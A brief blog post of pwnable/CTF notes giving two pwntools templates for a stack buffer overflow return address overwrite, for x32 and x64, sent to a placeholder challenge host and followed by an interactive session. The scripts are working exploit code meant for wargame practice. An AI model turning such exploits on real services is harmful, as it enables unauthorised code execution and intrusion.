---
title: bof
author: janger
date: 2023-09-25
category: pwnables
layout: post
---



**pwntools for Return Address Overwrite(x32)**

{% highlight python %}
```python
from pwn import *

p = remote('example.pwnable.io', 8000)

dummy = b'A' * 20
sfp = b'B' * 4
ret = p32(0x08048087)

payload = dummy + sfp + ret

p.send(payload)
p.interactive()
```
{% endhighlight %}

<br>

**pwntools for Return Address Overwrite(x64)**

```python3
from pwn import *

p = remote('example.pwnable.io', 8000)

dummy = b'A' * 20
sfp = b'B' * 8
ret = p64(0x08048087)

payload = dummy + sfp + ret

p.send(payload)
p.interactive()
```

<br>

